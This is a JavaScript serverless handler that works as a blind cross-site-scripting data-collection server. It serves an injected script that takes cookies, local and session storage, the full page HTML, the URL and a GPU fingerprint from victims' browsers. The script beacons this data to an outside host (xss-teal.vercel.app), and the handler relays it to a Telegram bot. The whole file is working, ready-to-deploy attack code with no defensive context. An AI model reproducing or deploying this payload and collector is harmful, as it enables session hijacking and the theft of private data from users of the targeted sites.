export default async function handler(req, res) {
  if (req.method === 'POST') {
    const data = req.body;
    await sendTelegram(data);
    return res.status(200).json({ status: 'received' });
  }
  
  if (req.method === 'GET' && req.query && Object.keys(req.query).length > 0) {
    const encodedData = Object.keys(req.query)[0];
    try {
      const data = JSON.parse(Buffer.from(encodedData, 'base64').toString());
      await sendTelegram(data);
    } catch(e) {}
    
    const pixel = Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64');
    res.setHeader('Content-Type', 'image/gif');
    return res.send(pixel);
  }
  
  res.setHeader('Content-Type', 'application/javascript');
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  
  const payload = `
var data = {};

function safe(val) {
  return val !== undefined ? val : "";
}

function sendData(payload) {
  var img = new Image();
  img.src = 'https://xss-teal.vercel.app/?' + btoa(JSON.stringify(payload));
}

function collectData() {
  try { data.uri = location.toString() || ""; } catch(e) { data.uri = ""; }
  try { data.cookies = document.cookie || ""; } catch(e) { data.cookies = ""; }
  try { data.referrer = document.referrer || ""; } catch(e) { data.referrer = ""; }
  try { data["user-agent"] = navigator.userAgent || ""; } catch(e) { data["user-agent"] = ""; }
  try { data.origin = location.origin || ""; } catch(e) { data.origin = ""; }
  try { 
    var lang = navigator.language || navigator.userLanguage || "";
    data.lang = lang;
  } catch(e) { data.lang = ""; }
  
  try {
    var canvas = document.createElement("canvas");
    var gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
    var debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
    var gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
    data.gpu = gpu || "";
  } catch(e) { data.gpu = ""; }
  
  try { data.localstorage = JSON.stringify(window.localStorage) || ""; } catch(e) { data.localstorage = ""; }
  try { data.sessionstorage = JSON.stringify(window.sessionStorage) || ""; } catch(e) { data.sessionstorage = ""; }
  try { data.dom = document.documentElement.outerHTML || ""; } catch(e) { data.dom = ""; }
  
  sendData(data);
}

function addListener(element, event, handler) {
  if (element.addEventListener) {
    element.addEventListener(event, handler, false);
  } else if (element.attachEvent) {
    element.attachEvent("on" + event, handler);
  }
}

if (document.readyState === "complete") {
  collectData();
} else {
  addListener(window, "load", function() {
    collectData();
  });
}
`;
  
  res.send(payload);
}

async function sendTelegram(data) {
  const botToken = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;
  
  let message = `🚨 XSS Payload Executed
URI: ${data.uri}
Origin: ${data.origin}
Cookies: ${data.cookies}
Referrer: ${data.referrer}
User-Agent: ${data['user-agent']}
Language: ${data.lang}
GPU: ${data.gpu}
LocalStorage: ${data.localstorage}
SessionStorage: ${data.sessionstorage}
DOM Length: ${data.dom?.length || 0} chars`;
  
  await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: chatId,
      text: message
    })
  });
}
